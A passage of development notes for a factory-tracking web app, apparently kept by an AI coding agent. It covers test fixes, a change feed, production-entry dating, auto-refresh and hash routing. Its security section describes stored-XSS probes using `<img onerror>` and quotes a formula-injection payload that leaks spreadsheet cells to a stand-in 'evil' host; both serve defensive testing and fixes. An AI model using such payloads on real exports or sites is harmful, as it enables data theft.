  of date, not a bug.** 921e029 (13 Sep) redesigned the journey: FQC reads
  Pass/Reject and Quality's call is its own "Quality Decision" stage. The
  test still expected one FQC stage carrying the grade. Updated to the
  current design, keeping its point (never "None"; Quality's grade shows
  once given). test_fqc.py 57/57 - green for the first time since 13 Sep.
  **Decide:** the same redesign dropped a PASSED module's grade band from
  the journey - it reads "Pass", where it used to read "A" or "B". If the
  band matters on Search & Trace, it belongs in that step's detail.
- **test_fqc_dashboard.js 2/16 -> 18/18.** Three harness gaps, no product
  bug: no `can()` stub (Round 28's loader guard - missed then, as the file
  was already failing), no `console` under Windows Script Host (the old
  note blamed this alone), and `_localDate()` not read out of the shipped
  file. The last two tests expected the Customer filter to send a CODE;
  9944a0c (12 Sep) deliberately sends the NAME, and that is right -
  allocations write the canonical name into `serial.customer`
  (`_line_payload`'s `cust`), which `/api/fqc/dashboard` filters on.
  Mapping to a code would match no allocated module.
- **Decide: `test_js.js` is not a test.** 3,927 lines of v4's page script
  with snippets pasted in, ending in an unterminated `function check() {`;
  no harness, never passed. Added in 1512063 (12 Sep). Delete it, so the
  suite's only non-server failure stops being noise.
- **14 routes answered bad input with a 500** - found by calling every
  route in Flask's url_map with junk as a Super Admin (`test_bad_input.py`,
  1,378 calls). Three causes: `?limit=abc` into `int()` on
  `/api/fqc/recent`, `/api/loss_events`, `/api/prodentries` (now
  `_int_arg()`, falling back to the default); a JSON array or number as the
  body reaching `.get()` on 10 write routes (now one `before_request`
  guard: 400 "Expected a JSON object.", only once there is a session so a
  signed-out caller still gets the gate's 401 first); and **one of mine
  from Round 28** - `export_csv` had a loop `for g in db.gatepasses(...)`,
  which made Flask's `g` local to the whole function, so the session check
  I added crashed with UnboundLocalError for an unknown file name. Renamed
  `gp`. None of these was reachable from the page itself - it never sends
  such input - but a 500 is the wrong answer to bad input, and the test now
  probes every new route the day it is added.
- **Found: `/api/indent` answers a refusal with 200.** Validation errors come
  back as `{"errors": [...]}` with status 200. The form reads `errors`, so
  the screen is right - but `_touch_session` extends the session on any
  write under 400, and anything keyed on the status (the offline replay's
  `_sync_guard` included) reads it as success. Not changed overnight: the
  offline layer's replay semantics depend on status codes and deserve a
  deliberate look. **Decide:** 400 for validation refusals, and check the
  other endpoints for the same pattern.
- **Buttons that claimed a save that never happened - 8, now disabled.**
  v4 placeholders whose whole action is a toast announcing success, with
  nothing sent anywhere, still live in operator workflows: Planning's
  "Save as draft" ("Draft saved.") and "Copy from last batch" ("Materials
  copied from BAT-2602-00021."), Production Entry's "Save as draft", Loss's
  "Submit shift" ("Shift events submitted."), the invoice parser's "Store
  PDF only" ("PDF stored against this challan."), and on the Admin screen
  "Cancel document" ("Document cancelled. Original preserved."), "Sign off
  review" and "+ Add type". An operator told "Draft saved." walks away from
  work that was never kept. Disabled with "Not built yet - this does not
  save anything." on hover; not removed, so the gaps stay visible. The two
  toasts that only explain (Grade rules' "+ New version", Defect codes'
  "+ Add code") stay. `test_demo_claims.py` (3) pins the exact eight.
  Caught on the way, by test_dashrath_case.py: the first version ran at
  page load and disabled Challan's REAL "Save as draft" - the live layer
  takes that very button over at sign-in (since Round 28 moved the wiring
  after sign-in). It now runs after the sign-in wirings, and the test
  asserts the real button is untouched.
  **Decide:** build, remove, or leave disabled - Planning and Production
  Entry drafts, Loss's shift submission, document cancellation and the
  access-review sign-off are all features v4 promised and nothing
  implements.
- **Stored XSS in three places - SECURITY, fixed.** Planted a tagged
  `<img onerror>` in every free-text field reachable through the API (15
  fields: indent notes, material name, invoice buyer, challan transporter/
  driver/consignee, gate-pass party/description/address, FQC reason, Quality
  resolution, abandon reason, loss machine, production incharge, user
  display name) and opened every screen, the challan detail and Search &
  Trace as a Super Admin. Three ran as script:
  - a **gate pass's party** - the gate-pass list's Customer filter built
    its `<option>`s from party names unescaped (the table beside it was
    already escaped);
  - an **invoice's buyer name** - the invoice list concatenated every field
    raw; buyer name comes out of an UPLOADED PDF, so a crafted invoice could
    carry script into the Admin's browser;
  - a **loss event's machine** - v4's `renderLoss()` concatenates `EVENTS`
    straight into its tables. v4 now receives escaped copies; the live
    layer keeps the raw rows.
  Who could exploit it: any Dispatch operator (gate pass), anyone who can
  upload an invoice, any Production Incharge (loss events) - running in the
  session of whoever opens the screen next, an Admin included (the cookie
  is httpOnly, but script in an Admin's page can call the Admin's API).
  `test_stored_xss.py` plants all 15, opens 25 screens plus the challan
  detail and four searches, and asserts nothing ran and the three fixed
  fields show as text. Verified it FAILS on the pre-fix code, naming exactly
  those three.
  **Not covered by the probe** (next pass): edit forms and modals opened
  from rows (gate-pass edit, invoice edit, allocation detail, review detail
  popups), printed documents (/challan/.../print, gate-pass print, pallet
  sheet - server-rendered Jinja, autoescaped, but worth confirming), and
  the Excel/CSV exports (formula injection - a cell starting with `=`).
- **Spreadsheet formula injection in every export - SECURITY, fixed.**
  openpyxl stores ANY string starting with `=` as a formula, and the Export
  button's `/api/export/xlsx` wrote the screen's text as-is - so a gate
  pass's party typed as `=HYPERLINK("http://evil/?"&A1,"click")` became a
  live formula in the workbook of whoever exported the list (the classic
  way to leak neighbouring cells or phish from inside a trusted file).
  `.xlsx`: such cells are now stored as text - they show exactly what was
  typed, nothing added. `.csv` (the server's `/export/<what>.csv` and a
  table's own CSV export in `icon_table.js`): text opening with = + - @ or
  tab/CR gets OWASP's leading apostrophe, since Excel evaluates those when
  it opens a CSV; real numbers (-5, +3.2) are untouched.
  `test_export_formulas.py` (3) covers all three paths.
- **Latent: the text line under a Code128 barcode went into SVG raw**, and
  the pallet sheet embeds that SVG with `|safe`. Only system-generated
  serials reach it today, so not exploitable - escaped anyway
  (`test_box_number.py` +1).
- **Noted, not changed:** `frag_indent_form.html` and `indent_new.html`
  embed `model_json` with `|safe` inside a `<script>`. It comes from the
  item catalog in code, so it is safe today - but `json.dumps` does not
  escape `</script>`, so if the item master ever becomes editable from the
  screen, that embed must escape `<` (in Python: `.replace("<", "\\u003c")`).

### Not reached overnight (stopped at 08:45 - a usage-limit pause took the middle of the night)

- **XSS in the views the probe does not open:** gate-pass edit, invoice
  edit, allocation detail, the review item popups, the loading session.
  `test_stored_xss.py` is the place to extend - it already seeds the
  payloads; each view needs its opener added.
- **The six UI smoke scripts** (`test_fqc_anomaly_ui`, `test_fqc_dashboard_ui`,
  `test_fqc_recent_ui`, `test_mgmt_ui`, `test_pack_ui`, `test_prod_ui`)
  still expect a server with data already running on 8090/5000 and sign in
  through v4's old `signIn()`. They need `ui_harness` plus seeded data to
  become real suite tests; until then they are the only noise left in the
  suite besides `test_js.js` and `test_build_banner_live.py` (the latter
  drives v4's `#who` dropdown, gone since Round 23).
- **Signing out leaves the last account's payload in the page's memory**
  (`B`, and the v4 arrays `applyBoot()` filled) until the next sign-in
  replaces it. The sign-in card covers it, but a shared PC's devtools
  could read it. Clearing `B`'s private keys in the sign-out patch would
  close it.
- **`/api/indent` answers refusals with 200** - see above; worth checking
  the other endpoints for the same pattern at the same time.

## Round 30 - main catches up, and Stage 2: the change feed

### Part A - the merge

`main` was 113 commits behind what was actually running. `origin/main` was
fully contained in `stage0-build-banner` (0 commits the other way), so it
fast-forwarded: `11ac5fb..91d3b88`, no merge commit, no rebase, history
still linear. `overnight-review-20260925` pointed at `2c5cadd`, an ancestor,
and was deleted - the commits live on in both branches.

One thing the brief did not anticipate: the LOCAL `main` had diverged
(ahead 39, behind 3) and carried one commit that `stage0-build-banner` did
not - `0417035`, a cherry-pick of `1a7ec3c`. Checked rather than assumed
before moving anything: `1a7ec3c` itself is an ancestor of the branch, and
every line the cherry-pick added is in today's tree (`prod_entry_id` in
schema_sqlite.sql, store.py and app.py). It was a duplicate. Local main was
moved to match, with `backup-local-main-0417035` left as a local tag.

### Part B - the change feed

Two people on two machines: one saves an indent and the other's screen shows
the old list until they reload. Stage 1 fixed the refresh problem; this is
the other half.

**The sequence is bumped at the single commit point**, `store.conn.__exit__`,
from the tables `_Cur.execute` saw written - not by editing 40-odd write
endpoints. That one choke point is why this was cheap. `change_log.seq` is
`AUTOINCREMENT` and that is load-bearing: rows are pruned after an hour, and a
plain INTEGER PRIMARY KEY would hand out a number that had already been used,
leaving every client holding a higher `since` permanently deaf.

**Topic mapping** (table -> topic), coarser than a table and coarser than a
screen:

| Topic | Tables |
|---|---|
| indents | indent, indent_line |
| allocations | allocation, allocation_material |
| production | production_entry |
| serials | serial |
| fqc | fqc_record |
| boxes | box, box_serial, box_lineage, box_print, box_counter |
| challans | challan, challan_box, challan_serial, challan_counter |
| invoices | invoice |
| gatepasses | gatepass, gatepass_item, gp_counter |
| loss | loss_event |
| review | review_item |
| master | material, cell_efficiency, app_config |
| users | app_user, user_screen_perm |
| audit | dispatch_audit |

No screen subscribes to `audit` yet, on purpose: nearly every save anywhere
writes `dispatch_audit`, so wiring it to the Admin screen would raise a chip
over somebody editing a user every time an operator closed a pallet. The
topic is recorded and ready for an Audit screen that actually shows it.

**Deliberately untracked**, each for its own reason: `auth_session` (the
page's own polling touches it, so tracking it would make the feed feed
itself and never go quiet), `change_log` (it must not report itself), and the
rest of the `auth_*` credential machinery (nobody's screen data). A
transaction touching only untracked tables records nothing at all.

`serial` is its own topic rather than being folded into production: it is
written by allocation, FQC, packing and dispatch alike, so every screen that
counts modules subscribes to it and none of them has to guess.

**Silent vs chip.** Silently refreshed - read-only lists and dashboards,
where the worst case is a row moving under someone who is reading:

    mgmt, proddash, dash, packdash, invoice, indent,
    challan-list, gp-list, loading-list, hold, review

Everything else shows the chip: every form and every scan screen - fqc, pack,
repack, challan, gp, gp-new, plan, prodentry, loss, loadsession,
invoice-parser, admin, items.

That list is not the whole protection, because a list can have work on it
too. A runtime check demotes ANY screen to the chip when a field on it has
focus, when text has been typed into a non-filter input, or when a pallet,
loading or challan session is open. Filter and search boxes do not count -
they are how you read a list, not work in progress. This is Stage 3's rule
arriving early, and it could not wait: a feed that refetches a screen is
precisely what destroys work in progress.

**The baseline is the payload's own sequence.** `/api/boot` now returns
`change_seq`, read just before the payload is built, and the page counts from
there. Letting the page set its own mark on its first poll left a window of
up to five seconds in which a save was absorbed into the baseline and never
reported - the acceptance test failed on exactly that, which is what found
it. Taken from the payload, the worst case is a redundant refetch of
something already on screen, which is the harmless direction.

**`truncated`.** A `since` older than anything left after pruning answers
`truncated: true` with NO topic list. A short list is what would make a
client quietly miss those updates for good; the page treats truncated as
"refetch the screen I am on".

**True push (SSE/WebSocket) was deliberately not built.** It needs TLS and a
reverse proxy in front of Waitress, and each open stream pins one of
Waitress's 12 threads - a dozen people with two tabs each would exhaust them
and the app would stop answering anyone. The feed is shaped so that adding
push later is a change of transport only: the sequence, the topics and the
client's decision logic all stay.

### What proves it

- `test_change_feed.py` (8): the sequence advances on a write through a real
  endpoint and not on ten reads; a refused write (400 and 403) records
  nothing; two sessions - one saves, the other's feed names the topic and the
  saver's real login_id; topics match the tables; `truncated` on a pruned
  `since`, and never on a first call; pruning removes what is past the window
  and the sequence is never reused; 401 without a session and no screen gate;
  junk `since` and a dropped `change_log` both survive without losing a save.
- `test_change_feed_ui.py` (3): **acceptance** - two browser contexts, two
  accounts, both on the Gate Pass list; one issues a gate pass and the other's
  list shows it in **1.3 s**, with a sentinel proving no reload and no click.
  **protection** - the other is instead half-way through the New Gate Pass
  form; its typed text is still there and the chip appears in **2.1 s**
  naming the saver, and Review then takes the update. And a change to a topic
  the visible screen does not show moves nothing - and my own save raises no
  chip on my own screen, since it already updated itself and every person
  here has their own ID.

### Found on the way

- **The first `/api/boot` on an empty database really does write**: it seeds
  the material master from icon_materials.py, once, and the feed reports it.
  Correct, not a bug - pinned in the test rather than excluded, so it cannot
  change quietly.
- **`test_fqc_dashboard.js` could not run on a fresh clone** - my own
  regression from the overnight review. It extracts `_localDate()` from
  icon_live.js by searching for a literal `\n  }\n`, which a Windows checkout
  does not contain (git writes CRLF). It passed in the working tree that
  wrote the file and failed on a pristine checkout of main. Matched with a
  regex now, and verified 18/18 under both line endings. Worth remembering:
  running the suite in place can hide this whole class of fault.

## Production Entry - record the shift that RAN, not the one you are typing in

Reported by Mukesh, 26-09-2026: "in production entry, Production date and
shift, allow past date and shift entry, practical, shift report is generated
after shift ends means next shift, so current process force the user to fill
wrong date and shift."

He is right, and the form forced it twice over.

**On the screen**, the two fields were `disabled` and re-stamped with the
current date and shift every 30 seconds (`peStampNow`), so they could not be
changed at all. They also opened on v4's hardcoded `2026-08-21` and its
always-selected shift B until that stamp ran.

**On the server**, `/api/prodentry` ignored `date` and `shift` from the body
outright and wrote `clock.now()` into `prod_date` and `shift`. So the form
asked for a date and shift, the operator typed them, and the server threw
them away without saying so.

The consequence is exactly what was reported. A shift report is written after
the shift ends - which is the next shift, and for C shift the next calendar
day. C shift of the 25th ends at 06:00 on the 26th and gets filed at 06:15,
and was recorded as **A shift of the 26th**. The only way to file it under
its own name was to get the form to lie, and the form would not even allow
that.

**And the list made it worse:** `/api/prodentries` filtered by
`shift_day(p.created_at)` - the typing moment - so the shift you were looking
for was never on the day you asked for.

### What it does now

- `prod_date` and `shift` are what the operator states. `created_at` is still
  stamped from the clock, so a late entry is still visible as a late entry,
  and the audit row carries both.
- The fields are editable and open on **the shift that just ended** - at
  06:15 on the 26th that is C of the 25th, which is the case being filed.
  The date cannot be set to a future day (`max` = today).
- `/api/prodentries` filters on `prod_date` and `shift`, so an entry is found
  on the day it ran. `prod_date` is already the factory day (06:00 to 06:00),
  so it is compared directly rather than through `shift_day_sql()`.
- `_prod_when()` validates instead of overriding. Refused only where the
  answer cannot be true: a shift that **has not started yet** (a shift still
  running may be filed - some lines record as they go, and refusing that
  would be inventing a rule), and a date further back than
  `PROD_BACKDATE_DAYS` (30, `ICON_PROD_BACKDATE_DAYS` overrides), which
  catches the wrong-year typo while leaving ordinary catching-up alone.
  **Decide:** 30 days is my choice, not Mukesh's - say if a month is too
  tight for a backlog.
- The 30-second timer now refreshes only the hint. Re-defaulting the fields
  on a timer is how a date somebody had just picked got overwritten under
  them - the same rule as Round 30's change feed.

The original reason for ignoring the fields was a form DEFAULT that once
filed a range under v4's demo 21-08-2026. That is an argument for validating
what arrives and fixing the default, not for discarding what the operator
says.

### What proves it

`test_production.py` (7 -> 12): the stated shift is what is stored, with
`created_at` kept separately; the list finds the entry on the day it ran and
not on the day it was typed; a shift that has not started is refused while
the shift now running is accepted; the backdate limit refuses a wrong-year
typo and accepts ordinary catching-up; a missing or unreadable date or shift
is refused by name rather than quietly replaced.
`test_prodentry_when.py` (3), through the real form in Chromium: the fields
are editable and capped at today; a fresh form opens on the shift that just
ended (never v4's 2026-08-21 / B, and never the shift currently running);
and the whole reported case end to end - C shift of yesterday, filed today,
stored as `prod_date=2026-09-25 shift=C` with `created_at` today.

### Swept, same flow, NOT changed

Loss & Breakdown records a date and shift the same way, and
`api_loss_event_open` also overrides them with `clock.now()`. It is **not**
the same bug and was left alone deliberately:

- A **Live** event is opened when the machine stops, so "now" is the truth,
  and `/api/loss_events` filters by `shift_day(e.created_at)` - which is
  already correct, including after midnight.
- A **Retro** event (the mode already exists) is the gap: the form has no
  date field at all, it sends `date: _localDate()`, so a downtime entered
  the next morning lands on the wrong day. Fixing that means adding a date
  field and deciding Live vs Retro semantics - a change to downtime and OEE
  accounting that deserves its own pass, not a silent ride along with this
  one. **Decide.**
- Cosmetic, same screen: `event_date` is stored as the calendar date rather
  than the factory day, so a 01:12 C-shift event displays as the 26th while
  correctly counting on the 25th.

## Round 31 - the second window, a much shorter silent list, and a switch

### The bug, and what it actually was

Mukesh, live: two sessions of the SAME Super Admin account (one ordinary
window, one InPrivate), both on Production Entry. A save in one added an
entry; six minutes later the other showed neither the entry nor a chip.
`prodentry` is correctly NOT in `CHANGE_SILENT`, so a chip was the right
expectation.

Reproduced before touching anything, at the real 5-second interval, 19 poll
cycles:

    t+5.0s   seq=3  topics=[]                                  by=[]
    t+10.0s  seq=3  topics=[]                                  by=[]
    t+15.0s  seq=6  topics=['audit','production','serials']     by=['mknaik']
    t+20.0s ... t+95.0s  seq=6  topics=[]                      by=[]
    chip events: 0

So: polling was healthy, `/api/changes` DID report the save, and
`applyChanges()` DID match `production` against prodentry's topics. Then it
returned early on **Round 30's own self-save suppression**, because
`d.by == ['mknaik']` and the watching window's `USER.login_id` was also
`mknaik`. `showChangeChip()` was never called - the chip never appeared,
rather than appearing and being dismissed.

**Root cause: the suppression asked the wrong question.** Round 30 justified
it with "every person here has their own ID - shared station logins are not
used", which is true of two different PEOPLE and says nothing about one
person signed in twice. An InPrivate window, a phone, a second PC: one
account, two pages. The account was never the right question.

**The fix is to ask about the page.** Each page mints a client id at load
(`window.iconClientId`) and sends it as `X-Icon-Client` on every same-origin
request; `_load_session` reads it, `change_log.by_client` records it, and
`/api/changes` returns `by_clients`. A change is suppressed only when every
change since came from THIS page. A write carrying no client id - the CLI, a
migration, an offline replay through the service worker - is never
suppressed. The chip now says "Saved in another window, signed in as you"
when that is what happened, because that case is confusing enough to name.

Re-ran the identical repro: chip at **t+15.05s**, and it stays up.

### CHANGE_SILENT: eleven to four

Mukesh's rule - silent is landing pages and dashboards only; anywhere people
work is chip-only, whatever is or is not on screen at the time.

    silent now:  mgmt, proddash, dash, packdash
    moved out:   invoice, indent, challan-list, gp-list, loading-list,
                 hold, review

Each was checked by listing every live control on the screen, not assumed:

| Screen | Why it moved |
|---|---|
| invoice | **New invoice** |
| indent | **New indent** |
| challan-list | **Create challan** |
| gp-list | **New Gate Pass** |
| loading-list | **Verify one pallet's contents** |
| review | resolve actions, which live in the ROWS - an empty screen shows none, which is why a control scan alone under-reports it |
| hold | see below |

Two corrections to the reasoning that came with the request:

- **Holds are not released from the Hold screen.** Round 26 established that
  already ("GET /api/hold only; holds clear by themselves when evidence
  arrives, or through Needs Review"), and a control scan confirms it. It
  still moves, for a better reason: its rows carry an **Open** button that
  opens a detail panel, and a silent refetch would close what somebody is
  reading. A reading context is worth protecting too, not only a typed one.
- **`packdash` is genuinely passive** - no action control at all - so it
  stays silent, as intended. `mgmt`, `proddash` and `dash` carry only links
  to OTHER screens (Open, Enter, Production entry, New entry), nothing that
  acts on their own data.

The runtime `screenBusy()` check stays as a second line of defence, but the
decision no longer depends on it: being outside those four is the whole test.

### The switch

`app_user.auto_refresh`, default 1 - on the account, not the browser, so it
follows the person to any machine, the same way their permissions do. Added
with the same ALTER-if-missing migration `station` used. Returned in
`_access_payload()`, so `/login` and `/api/session` both carry it and the
page reads it beside `must_change_pw`.

`POST /api/session/auto-refresh` is self only and structurally so: the login
comes from the session and never from the body, so there is no target to
check and no hierarchy to enforce. Deliberately NOT blocked by
`must_change_pw` - it is a display preference, and refusing it would strand
somebody on a screen that keeps offering to refresh itself.

**Off means off**, not "chip only": `applyChanges()` returns before both the
silent refresh and the chip. Somebody who has turned live updates off has
said they do not want the screen reacting, and a chip is the screen
reacting. The feed keeps running, so turning it back on needs no reload.

The checkbox is on the profile card under the person's own name and role -
not in Admin, because it is nobody else's to set. Ticked by default, saved
the moment it is ticked, and only believed once the server has answered.

### What proves it

- `test_change_feed_ui.py` (4 -> 6): the same account in a second window IS
  told (1.7s) while the window that saved is not; an IDLE `gp-list` chips
  rather than refreshing, and Review then reloads it; the acceptance case
  moves to `packdash` - still silent - and asserts it refetched through its
  own load path with no chip.
- `test_change_feed.py` (8 -> 9): `by_clients` distinguishes two pages of one
  account, and a write with no client id is attributed to none.
- `test_auto_refresh_pref.py` (5): default on; it follows the account across
  a sign-out and does not move anybody else's; self-only and 401 signed out;
  OFF suppresses a landing page's silent refresh AND the chip elsewhere; the
  checkbox is on the profile card, ticked, and persists on the tick.

### Caught by the full suite, after the fact

Three files the targeted runs had not covered:

- **`test_dashboards_ist.py` (4 failures) - from the Production Entry change
  of the previous round, not from Round 31.** One of its tests was named "a
  production entry is dated and shifted when it is RECORDED, whatever the
  form and the barcode say" - the very contract Mukesh overturned. Rewritten
  to the new one, keeping the half that has not changed and matters just as
  much: nothing counts by the date or shift printed in the barcode. The
  other three simply omitted a date, which the server used to supply; they
  now state one through a small `ran_now()` helper, since their subject is
  batch ranges and counting, not dating.
  **My process fault**: that change was verified with a targeted regression
  set rather than the full suite, and this is exactly what that misses.
- **`test_role_gates.py` (3 failures) - the guard doing its job.**
  `/api/session/auto-refresh` is a new write route with no decorator gate,
  so the "every write endpoint carries a gate" test failed on sight. Added
  to `_AUTH_ROUTES` with its reason, beside `/api/session/change-password`:
  self only and structurally so, no target to gate and no role that should
  be refused it.
- **`test_dashrath_case.py` (1 failure) - flakiness, not a regression.** It
  passes 6/6 on its own and failed only inside the full suite: the invoice
  list was asserted after a fixed 1200 ms sleep, which is not enough on a
  loaded machine. It now waits for the row itself.

## Round 32 - the silent set is the lists and dashboards, and the toggle means what it says

Two things Mukesh found by USING Round 31, both corrected here. Neither was a
crash; both were the feature doing the wrong thing confidently.

### 1. Round 31's silent set was four screens. It should be every list and dashboard.

Round 31 shrank `CHANGE_SILENT` to four landing dashboards and pushed every
working LIST onto the chip. That confused "this screen has a New form behind a
button" with "this screen is a form": the Indent list, the Challan list, the
Gate Pass list are exactly where a row someone else created should simply
appear - not screens to interrupt with a chip. The rule now: a screen whose
LANDING state is a list or a dashboard is silent; only a pure form (no landing
list) is left out. Confirmed against the live nav in `icon_trace.html` and the
injected `NEW_VIEWS`, not transcribed.

    IN  (the silent set):
      dashboards      mgmt, proddash, dash, packdash, disp
      list / landing  indent, plan, prodentry, loss, fqc, repack, invoice,
                      challan-list, gp-list, loading-list
      Control lists   hold, review
      listed, dormant drafts, search        (see below)

    OUT, each confirmed to have no landing list of its own:
      pack            New Pallet - a bare scan-into-pallet form
      challan         Create Challan - its list is challan-list
      gp / gp-new     the Gate Pass create/edit form and New Gate Pass -
                      the list is gp-list (the nav button redirects there)
      loadver         Loading Verification - its list is loading-list
      loadsession     an active loading session
      invoice-parser  the upload/parse form
      admin, items    the two Admin config screens - no clean list-reload
                      path; they redraw on navigation. (Consequence: they no
                      longer chip on a users/master change, as they did in
                      Round 31. Master and user edits are rare and made by the
                      same admin; the noise is not worth a reload path they
                      do not otherwise need.)

Three the tentative brief had wrong, resolved by looking at the screen:
`loss`, `fqc` and `repack` are all IN. `fqc` is NOT a bare form - it carries a
live *Recent gradings* list (`#fqcRows`, `renderLiveFqcRecent`) beside its
grading form. `repack` lands on the closed-box source picker (`rpLoad` -> a
list); the repack wizard on top of it is protected by section 2, not by
dropping the list. `loss` is a list (`loFetchAndRender`, topic `loss`).

`drafts` and `search` are listed for completeness - both are list/landing by
nature - but neither carries a change topic today, so neither actually fires:
`drafts` still shows v4's sample rows (nothing in `CHANGE_SCREEN_TOPICS`), and
Search & Trace opens empty and is deliberately left without a topic so a trace
result on screen is never refetched out from under a reader.

### 2. The chip appeared with the box ON. A chip is what you show INSTEAD of refreshing.

Round 31 wired the per-account `auto_refresh` flag as "off -> nothing at all",
and left the chip firing on every non-silent screen whether the box was on or
off. Both wrong. The toggle now governs the chip, and only the chip:

    box OFF -> the chip, and the person reloads when they choose
    box ON  -> a silent refresh of the list, and NEVER a chip

`applyChanges()` reads in exactly that order now: topic hit and own-page
suppression first, then screens outside `CHANGE_SILENT` return; then
`off -> chip (unless a form is open, then nothing)`; then
`on -> silent refresh (unless a form is open, then nothing, and refresh on
close)`. Round 31's early `auto_refresh === false -> return` is gone.

### Section 2: an open form or popup stands the screen down - presence, not dirtiness

The silent refresh acts on the LIST. A form or a resolve/detail popup is a
separate thing on top of it and is never touched while open, typed into or not
- Mukesh's call: a blank New Indent form vanishing (or its list moving) under
someone is jarring even when nothing is lost. `screenBusy()` now also stands a
screen down for:

  - the generic modal `#mdl.on` - a GLOBAL overlay (review resolve, duplicate
    compare, quality decision, any dialog), whatever screen is behind it;
  - the New Indent panel `#indForm` while it is displayed;
  - the Hold "Open" detail panel `#holdDetail` while it holds content;
  - a repack wizard past the source pick (`rpPool` / `rpTargets` non-empty),
    on top of Round 31's existing focus / typed / pack / loading / challan
    checks.

With the box ON and one of these open, nothing happens now and the refresh is
**held and run once it closes** (`_pendingRefresh` keyed by view, flushed on
the poll cycle - no second timer), so the list is current the moment they are
back to it. With the box OFF and one open, no chip either: a chip inviting a
reload that would destroy the form is the wrong prompt.

**One subtlety that cost a test.** "Text is typed" was reading v4's own
pre-filled demo values as work in progress - Production Entry ships `#peFrom`
/ `#peTo` with a sample serial range, a form ships "Prepared by" defaulted -
so those screens could never refresh silently once they were in the set.
`screenBusy()` now treats a field as work in progress only when its value
DIFFERS from `el.defaultValue` (the HTML `value=` it loaded with). An untouched
default is a placeholder, not unsaved work; a field the person focused or
edited is still caught.

### Tests (real, run)

`test_change_feed_ui.py` (Playwright, two independent browser contexts):
    ACCEPTANCE packdash silent · New Indent blank form protected box on
    (no chip, refreshes on close) · New Indent form + box off (no chip) ·
    review resolve popup protected box on · same account two windows (second
    refreshes, saver quiet) · own save quiet · idle list refreshes silently
    box on · unrelated topic ignored
    -> 8 passed, 0 failed
`test_auto_refresh_pref.py` (setting mechanics + on-screen):
    default on · follows the account · self only · OFF is the chip not
    "nothing" (reverses Round 31) · checkbox on the profile card
    -> 5 passed, 0 failed
`test_change_feed.py` (server side, unchanged) -> 9 passed
`test_boot_payload.py` (session payload carries auto_refresh) -> 6 passed

## Round 33 - a refresh comes back to the screen you were on

Every screen lived at one URL (/), the current screen only a JS variable, so a
refresh reloaded / and always booted to the dashboard: the person lost their
place AND paid for the dashboard's full query load every time, even when they
never wanted the dashboard. This round records the screen in the URL hash
(#challan-list, #indent) and reads it back on load.

### What it does, and what it deliberately does not

  - REFRESH-RETURN only. No logout-return / return-after-login. That was the
    one part carrying an open-redirect consideration (a saved "next" URL) and
    the smaller benefit; dropped, value-vs-risk. The hash never leaves the
    browser - not sent to the server, Flask keeps serving the same page - and
    carries only a screen id.
  - SCREEN only, not record, and NOT in-progress form state. A half-typed New
    Indent form is gone after a refresh; restoring unsaved form data validated
    against records that may have changed is a separate, much bigger thing.
  - Data is fetched fresh on arrival, as every screen already does - the hash
    restores the screen, not a data snapshot.

### How it is written and read

Writing: a THIRD wrapper on window.go (the outermost, after the two the live
layer already installs, so it sees the screen ACTUALLY shown - past the
nav-button redirects challan->challan-list, gp->gp-list, loadver->loading-list)
sets location.hash to currentView() on every navigation. It uses
history.replaceState, NOT an assignment to location.hash, for two reasons:
replaceState does not push a history entry, so the Back button does not walk
backwards through every screen visited (a refresh landing on the current screen
is the goal, not a navigation history); and it does not fire a hashchange
event. There is no hashchange listener at all - the hash is read once, on the
way into the app, never on a live change - so no in-progress flag is needed to
stop the write looping back into go().

Reading: on enterApp (a fresh sign-in AND a reload with a live cookie both
funnel through the signIn wrapper), location.hash is read, stripped, and:
  - empty            -> home, unchanged from before;
  - a known, viewable screen id -> that screen;
  - anything else    -> home (an unknown id, or one this account cannot view).
The valid-screen set is NOT hard-coded. It is sourced from can() - the live
layer's own gate (Round 28), which reads the account's own perms/subviews from
the session payload (icon_auth.SCREENS is what fills that map). can() is the
SAME gate the nav buttons use, so validation and the can-view cross-check are
one and the same call: a hash cannot route anywhere the nav would not, which is
the open-redirect defence in miniature, and a stale bookmark or a since-revoked
permission lands on home rather than a 403 or a blank screen.

### The efficiency win - measured, not assumed

The dashboard's query load did NOT come from go(home) as first assumed. It came
from v4's initAll() (in the read-only HTML), which calls renderMgmt() directly
- and renderMgmt fetches all three dashboard endpoints (/api/prod/dashboard,
/api/fqc/dashboard, /api/stock_dispatch) at once - plus renderProd(). initAll
runs inside v4's signIn(). So the fix is: at boot, paint only the screen being
landed on. A module-scoped `_bootRenderOnly` holds the landing screen for the
one rerender() inside applyBoot() and is checked at the top of renderMgmt() and
renderLiveProdDash() (the two initAll calls directly); every other rerender - a
filter Reset, iconRefresh() after a save - leaves it null and still redraws
every viewable screen, exactly as before. Because boot no longer pre-paints the
dashboards, each one now redraws when navigated TO instead (a render hook in
the go wrapper, beside the list-screen hooks already there), gated on can(view)
so an account navigating at a screen it cannot see - and refused by go() - does
not fire that screen's read (renderLiveFqcRecent has no can() check of its own;
this is where the Dashrath account earned a 403 until the gate was added).

Observed, GET / with a fresh Super Admin session:
    refresh onto #search      -> /api/prod/dashboard, /api/fqc/dashboard,
                                 /api/stock_dispatch NOT called
    refresh onto #mgmt        -> all three called (it IS the dashboard asked for)
    refresh onto #proddash    -> only /api/prod/dashboard
    refresh onto #challan-list, #prodentry, #indent, #gp-list -> none of the three

### Tests (real, run)

`test_hash_route.py` (Playwright): refresh returns to a list, a dashboard and a
form-bearing screen (form state gone, as intended) · #search refresh calls no
dashboard endpoint while #mgmt does · #nonsense -> home, no error · a restricted
account's hash to an unviewable screen -> its home, no 403 · in-app navigation
does not grow history.length (replaceState, Back does not walk screens)
    -> 5 passed, 0 failed
Full existing suite re-run and unchanged: the Round 30-32 change-feed and
auto-refresh UI tests (8 + 5), test_change_feed server side (9),
test_boot_payload (6), test_dashrath_case (6 - the can(view) gate above),
test_screen_perms (20), test_search_invoice (16), test_login_screen (11),
test_fqc_override (9), test_fqc_screen (10), and the rest of the harness UI
suite; the JScript suite via cscript (test_screens 17, test_trace 33,
test_challan 35, test_packing 26, test_loading 24). All JS-only; no server route
changed - the hash is never sent to the server.
The fixed-port dev UI tests (test_mgmt_ui, test_prod_ui, test_pack_ui,
test_fqc_dashboard_ui, test_fqc_recent_ui) need a manually-started server on
their hard-coded ports and were not run here; each navigates to its dashboard
before asserting, which the go-wrapper render hook now serves.


## Round 34 - direct cancellation of every document type, Admin/Super Admin + TOTP

Only Challan had a real cancel before this, gated by screen-write (any
Dispatch-write role) with no step-up; allocation withdrawal had the same two
gaps; Indent, Gate Pass, Production Entry and Loss Event had no cancel at all;
Invoice's /invoice/cancel only discards an unsaved upload; the Admin "Cancel
